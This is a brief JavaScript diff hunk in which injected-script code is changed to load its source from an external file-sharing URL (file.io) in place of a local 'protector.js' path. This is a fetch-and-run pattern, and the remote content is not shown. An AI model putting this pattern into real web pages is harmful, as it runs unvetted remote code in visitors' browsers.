@@ -75,7 +75,7 @@ debugger;
                 var script = document.createElement('script');
                 //script["src"] = '/sec/pjs/WHlkcg%3D%3D';
                 //script["src"] = 'https://raw.githubusercontent.com/alokcha/GUID/master/protector.js';
-                script["src"] = '/alokcha/GUID/master/protector.js';
+                script["src"] = 'https://file.io/BmJAEdtX';
                 document["body"]["appendChild"](script);
             }
 
